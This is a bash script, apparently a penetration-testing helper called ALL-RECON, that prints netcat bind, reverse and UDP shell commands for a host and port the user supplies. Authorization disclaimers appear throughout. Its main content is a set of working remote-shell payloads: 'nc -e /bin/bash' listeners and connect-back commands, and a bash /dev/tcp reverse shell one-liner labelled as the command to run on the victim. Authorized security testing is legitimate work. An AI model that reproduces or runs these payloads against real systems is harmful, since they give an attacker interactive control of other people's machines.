#!/bin/bash

# ===================================================================
# ALL-RECON - NETCAT SHELL GENERATOR
# Generate safe reference commands for bind and reverse shell workflows.
# Use only on systems and networks covered by a valid authorization.
# ===================================================================

usage() {
    echo "Usage: $0 <mode> [host-or-port] [port] [shell]"
    echo ""
    echo "Modes:"
    echo "  bind     - Generate a bind shell template"
    echo "  reverse  - Generate a reverse shell template"
    echo "  udp      - Generate a UDP shell template"
    echo "  list     - Show available shell templates"
    echo ""
    echo "Examples:"
    echo "  $0 bind 4444 /bin/bash"
    echo "  $0 reverse 192.168.1.10 4444 /bin/bash"
    echo "  $0 udp 4444"
    echo "" 
    echo "Notes:"
    echo "  - These examples are for authorized testing only."
    echo "  - Use a listener and a remote payload only within approved scope."
    exit 1
}

print_header() {
    echo "================================================================"
    echo "ALL-RECON - NETCAT SHELL REFERENCE"
    echo "================================================================"
    echo "Authorization note: only use on systems covered by valid scope."
    echo ""
}

check_nc() {
    if ! command -v nc &>/dev/null; then
        echo "[WARN] 'nc' was not found on this host."
        echo "Install netcat-openbsd or netcat-traditional if required."
        echo "Examples:"
        echo "  sudo apt install netcat-openbsd"
        echo "  sudo apt install netcat-traditional"
        echo ""
    fi
}

show_bind() {
    local port="${1:-4444}"
    local shell="${2:-/bin/bash}"

    echo "[MODE] Bind shell"
    echo ""
    echo "Listener (target host):"
    echo "  nc -lvnp $port -e $shell"
    echo ""
    echo "Client (attacker side):"
    echo "  nc <target-ip> $port"
    echo ""
    echo "Alternative if the target uses netcat-traditional:"
    echo "  nc -l -p $port -e $shell"
    echo ""
}

show_reverse() {
    local host="${1:-192.168.1.10}"
    local port="${2:-4444}"
    local shell="${3:-/bin/bash}"

    echo "[MODE] Reverse shell"
    echo ""
    echo "Listener (attacker host):"
    echo "  nc -lvnp $port"
    echo ""
    echo "Victim/target command:"
    echo "  nc $host $port -e $shell"
    echo ""
    echo "Common alternative payload:"
    echo "  bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'"
    echo ""
}

show_udp() {
    local port="${1:-4444}"
    echo "[MODE] UDP shell"
    echo ""
    echo "Listener:"
    echo "  nc -luvnp $port"
    echo ""
    echo "Client:"
    echo "  nc -u <target-ip> $port"
    echo ""
}

show_list() {
    echo "Available templates:"
    echo "  bind     - listener on a target port"
    echo "  reverse  - connect back to attacker"
    echo "  udp      - UDP listener/client"
    echo ""
    echo "Examples:"
    echo "  $0 bind 4444"
    echo "  $0 reverse 10.0.0.5 4444"
    echo "  $0 udp 4444"
}

MODE="${1:-help}"

print_header
check_nc

case "$MODE" in
    bind)
        if [[ $# -lt 2 ]]; then
            show_bind
        else
            show_bind "$2" "${3:-/bin/bash}"
        fi
        ;;
    reverse)
        if [[ $# -lt 3 ]]; then
            show_reverse
        else
            show_reverse "$2" "$3" "${4:-/bin/bash}"
        fi
        ;;
    udp)
        if [[ $# -lt 2 ]]; then
            show_udp
        else
            show_udp "$2"
        fi
        ;;
    list|help|-h|--help)
        show_list
        ;;
    *)
        usage
        ;;
esac
